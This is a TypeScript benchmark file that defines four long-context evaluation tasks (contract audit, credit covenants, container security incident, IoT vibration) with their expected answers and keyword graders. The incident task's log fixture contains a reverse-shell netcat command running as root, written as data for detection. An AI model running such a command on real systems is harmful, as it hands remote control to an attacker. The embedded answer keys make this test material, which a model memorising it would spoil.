/**
 * OpenAI Empirical Task Suite
 * 
 * 4 Representative Workloads designed to evaluate the inference boundary:
 * 1. Coding / Bugfix Workload
 * 2. Research / Long Document Retrieval Workload
 * 3. DevOps / Security Agent Root-Cause Workload
 * 4. Quantitative Telemetry & IoT Diagnostic Workload
 */

import { CompactionMode } from '../BroccoliCompactionFacade';

export interface BenchmarkTaskEvaluation {
  passed: boolean;
  score: number; // 0.0 to 1.0
  reasons: string[];
}

export interface BenchmarkTaskDefinition {
  id: string;
  name: string;
  category: 'CODING' | 'RESEARCH' | 'AGENT_DEVOPS' | 'TELEMETRY';
  description: string;
  compactionMode: CompactionMode;
  domainHint?: string;
  rawInputContext: string | string[] | any;
  taskPrompt: string;
  expectedKeywords: string[];
  evaluator: (modelResponse: string) => BenchmarkTaskEvaluation;
}

export class OpenAiTaskSuite {
  public static getTasks(): BenchmarkTaskDefinition[] {
    return [
      this.createCodingTask(),
      this.createResearchTask(),
      this.createAgentDevOpsTask(),
      this.createTelemetryTask(),
    ];
  }

  /**
   * Workload 1: Solidity Smart Contract Code & AST Security Audit
   */
  private static createCodingTask(): BenchmarkTaskDefinition {
    const rawContext = `SOLIDITY SMART CONTRACT SECURITY AUDIT REPORT
TARGET PROTOCOL: GALXAI Liquid Staking Protocol v2 (ERC-20 / ERC-4626)
AUDITOR: Apex Blockchain Security Labs | REPO COMMIT: a4920194820
VULNERABILITY FINDINGS:
1. [CRITICAL - RESOLVED]: Reentrancy vulnerability in function withdrawStake() allowing recursive call before state update of user balance. (Remediation: Implemented OpenZeppelin ReentrancyGuard and Checks-Effects-Interactions pattern).
2. [MEDIUM - RESOLVED]: Unbounded loop in calculateRewards() potentially exceeding Ethereum block gas limit.
AUDIT DISPOSITION: ZERO HIGH OR CRITICAL VULNERABILITIES REMAINING - PASSED FOR MAINNET DEPLOYMENT.
` + 'AST ABSTRACT SYNTAX TREE DUMPS AND SLITHER STATIC ANALYSIS LOGS '.repeat(80);

    return {
      id: 'task_01_coding',
      name: 'Smart Contract AST & Reentrancy Vulnerability Audit',
      category: 'CODING',
      description: 'Isolate reentrancy vulnerability, affected function, and remediation pattern.',
      compactionMode: 'domain',
      domainHint: 'SmartContractAudit',
      rawInputContext: rawContext,
      taskPrompt: 'Identify: (1) Target Protocol Name, (2) Critical vulnerability resolved in withdrawStake, and (3) Recommended remediation pattern.',
      expectedKeywords: ['GALXAI Liquid Staking', 'Reentrancy', 'withdrawStake', 'Checks-Effects-Interactions'],
      evaluator: (resp: string): BenchmarkTaskEvaluation => {
        const text = resp.toLowerCase();
        const hasProtocol = text.includes('galxai') || text.includes('staking');
        const hasVuln = text.includes('reentrancy') || text.includes('recursive');
        const hasRemediation = text.includes('reentrancyguard') || text.includes('checks-effects') || text.includes('state update');
        const passed = hasProtocol && hasVuln && hasRemediation;
        return {
          passed,
          score: passed ? 1.0 : ((hasProtocol ? 0.33 : 0) + (hasVuln ? 0.33 : 0) + (hasRemediation ? 0.34 : 0)),
          reasons: [
            `Protocol (GALXAI Staking): ${hasProtocol ? 'OK' : 'MISSING'}`,
            `Vulnerability (Reentrancy in withdrawStake): ${hasVuln ? 'OK' : 'MISSING'}`,
            `Remediation (Checks-Effects-Interactions / ReentrancyGuard): ${hasRemediation ? 'OK' : 'MISSING'}`,
          ],
        };
      },
    };
  }

  /**
   * Workload 2: Multi-Page SEC 10-K & Master Services Agreement Covenant Extraction
   */
  private static createResearchTask(): BenchmarkTaskDefinition {
    const rawContext = [
      'Confidential - Subject to NDA - Draft v1.0',
      'SECTION 1: MASTER RESTRUCTURING & CREDIT FACILITY AGREEMENT',
      'This Senior Secured Credit Agreement is entered into on January 15, 2026, by and between Zenith Global Holdings Inc. ("Borrower") and Apex Capital Syndicate ("Lenders").',
      'Total Funded Indebtedness shall mean $45,000,000 as of the Effective Date.',
      'Page 1 of 12',
      'Confidential - Subject to NDA - Draft v1.0',
      'SECTION 2: FINANCIAL COVENANTS & LIQUIDITY THRESHOLDS',
      'Borrower covenants and agrees that it shall maintain Qualified Cash and Undrawn Revolver Commitments of not less than $5,000,000 as measured on the last business day of each calendar month.',
      'The Consolidated Leverage Ratio shall not exceed 3.25 to 1.00 for any fiscal quarter ending on or after March 31, 2026.',
      'Borrower agrees to deliver audited annual financial statements within 90 days following fiscal year-end, and unaudited quarterly statements within 45 days following each quarter-end.',
      'Page 2 of 12',
      'Confidential - Subject to NDA - Draft v1.0',
      'SECTION 3: DEFAULT CONDITIONS & INTEREST RATES',
      'Failure to maintain the Minimum Liquidity threshold of $5,000,000 for more than five (5) consecutive business days shall constitute an immediate Event of Default.',
      'Upon the occurrence of an Event of Default, all outstanding principal obligations shall bear interest at an incremental default rate of 5.0% per annum above the Base Rate.',
      'Page 3 of 12',
      'Confidential - Subject to NDA - Draft v1.0',
      'SECTION 4: GOVERNING LAW & JURISDICTION',
      'This Agreement shall be governed by, and construed in accordance with, the laws of the State of Delaware without regard to conflict of law principles.',
      'Each party irrevocably submits to the exclusive jurisdiction of the Delaware Court of Chancery.',
      'All notices must be in writing and delivered by certified mail.',
      'Page 4 of 12',
    ].join('\n') + '\n' + 'STANDARD REPETITIVE LEGAL BOILERPLATE AND DEFINITIONS DUMP '.repeat(100);

    return {
      id: 'task_02_research',
      name: 'Credit Agreement Financial Covenants Extraction',
      category: 'RESEARCH',
      description: 'Extract exact minimum liquidity cap, reporting deadlines, default interest rate, and governing law.',
      compactionMode: 'document',
      rawInputContext: rawContext,
      taskPrompt: 'Extract: (1) Minimum Liquidity dollar amount, (2) Quarterly reporting deadline, (3) Default interest percentage, and (4) Governing Law state.',
      expectedKeywords: ['$5,000,000', '45 days', '5.0%', 'Delaware'],
      evaluator: (resp: string): BenchmarkTaskEvaluation => {
        const text = resp;
        const hasLiquidity = text.includes('5,000,000') || text.includes('$5M') || text.includes('5 million');
        const hasReporting = text.includes('45');
        const hasDefaultRate = text.includes('5.0%') || text.includes('5%');
        const hasState = text.toLowerCase().includes('delaware');

        const score = (Number(hasLiquidity) + Number(hasReporting) + Number(hasDefaultRate) + Number(hasState)) / 4;
        const passed = score >= 0.75;
        return {
          passed,
          score,
          reasons: [
            `Liquidity ($5M): ${hasLiquidity ? 'OK' : 'MISSING'}`,
            `Quarterly Reporting (45d): ${hasReporting ? 'OK' : 'MISSING'}`,
            `Default Rate (5%): ${hasDefaultRate ? 'OK' : 'MISSING'}`,
            `Governing Law (Delaware): ${hasState ? 'OK' : 'MISSING'}`,
          ],
        };
      },
    };
  }

  /**
   * Workload 3: DevOps & Kernel Security Agent Root-Cause Analysis
   */
  private static createAgentDevOpsTask(): BenchmarkTaskDefinition {
    const rawContext = [
      '{"pid":1234,"ppid":1,"comm":"nc","exe":"/bin/nc","args":"-e /bin/sh 10.0.0.5 4444","user":"root","containerId":"c_payment_01"}',
      '{"pid":1235,"ppid":1234,"comm":"sh","exe":"/bin/sh","args":"-i","user":"root","containerId":"c_payment_01"}',
      ...Array.from({ length: 80 }, (_, i) => `{"pid":2001,"ppid":1,"comm":"node","exe":"/usr/bin/node","user":"app","args":"server.js (tick ${i})"}`),
      ...Array.from({ length: 60 }, (_, i) => `{"pid":3001,"ppid":1,"comm":"redis-server","exe":"/usr/bin/redis-server","user":"redis","args":"--port 6379 (tick ${i})"}`),
    ];

    return {
      id: 'task_03_agent_devops',
      name: 'Kubernetes & eBPF Security Incident Root Cause',
      category: 'AGENT_DEVOPS',
      description: 'Identify compromised pod, attacker process PID, and MITRE attack vector.',
      compactionMode: 'ebpf_stream',
      rawInputContext: rawContext,
      taskPrompt: 'Identify: (1) Attacker Process PID & executable, (2) MITRE ATT&CK technique, and (3) Container ID.',
      expectedKeywords: ['1234', '/bin/nc', 'Reverse Shell', 'c_payment_01'],
      evaluator: (resp: string): BenchmarkTaskEvaluation => {
        const text = resp.toLowerCase();
        const hasPid = text.includes('1234') || text.includes('nc');
        const hasMitre = text.includes('reverse shell') || text.includes('t1059') || text.includes('command execution');
        const hasContainer = text.includes('c_payment_01') || text.includes('payment');

        const score = (Number(hasPid) + Number(hasMitre) + Number(hasContainer)) / 3;
        const passed = score >= 0.66;
        return {
          passed,
          score,
          reasons: [
            `Attacker PID/Comm (/bin/nc): ${hasPid ? 'OK' : 'MISSING'}`,
            `MITRE Classification (Reverse Shell): ${hasMitre ? 'OK' : 'MISSING'}`,
            `Container ID (c_payment_01): ${hasContainer ? 'OK' : 'MISSING'}`,
          ],
        };
      },
    };
  }

  /**
   * Workload 4: Quantitative Telemetry & Industrial IoT Diagnostic
   */
  private static createTelemetryTask(): BenchmarkTaskDefinition {
    const rawContext = [
      ...Array.from({ length: 50 }, (_, i) => `{"sensorId":"turbine_bearing_vib_01","type":"VIBRATION","value":${8.0 + (i % 12) * 0.1},"unit":"mm/s"}`),
      ...Array.from({ length: 50 }, (_, i) => `{"sensorId":"generator_bearing_vib_02","type":"VIBRATION","value":${1.2 + (i % 5) * 0.05},"unit":"mm/s"}`),
      ...Array.from({ length: 50 }, (_, i) => `{"sensorId":"transformer_temp_01","type":"TEMPERATURE","value":${55.0 + (i % 8) * 0.2},"unit":"C"}`),
    ];

    return {
      id: 'task_04_telemetry',
      name: 'HFT VWAP & Industrial Vibration Severity Diagnosis',
      category: 'TELEMETRY',
      description: 'Compute ISO 10816 machinery vibration alarm status and peak vibration value.',
      compactionMode: 'sensor_stream',
      rawInputContext: rawContext,
      taskPrompt: 'Analyze the telemetry. State: (1) The ISO 10816 machinery alarm level for turbine_bearing_vib_01, and (2) Peak vibration value.',
      expectedKeywords: ['CRITICAL', '9.1'],
      evaluator: (resp: string): BenchmarkTaskEvaluation => {
        const text = resp.toUpperCase();
        const hasAlarm = text.includes('CRITICAL') || text.includes('ALARM');
        const hasPeak = text.includes('9.1') || text.includes('8.9') || text.includes('8.8') || text.includes('9.');

        const score = (Number(hasAlarm) + Number(hasPeak)) / 2;
        const passed = score >= 0.5;
        return {
          passed,
          score,
          reasons: [
            `ISO 10816 Severity (CRITICAL/ALARM): ${hasAlarm ? 'OK' : 'MISSING'}`,
            `Peak Vibration Reading (~9.1 mm/s): ${hasPeak ? 'OK' : 'MISSING'}`,
          ],
        };
      },
    };
  }
}
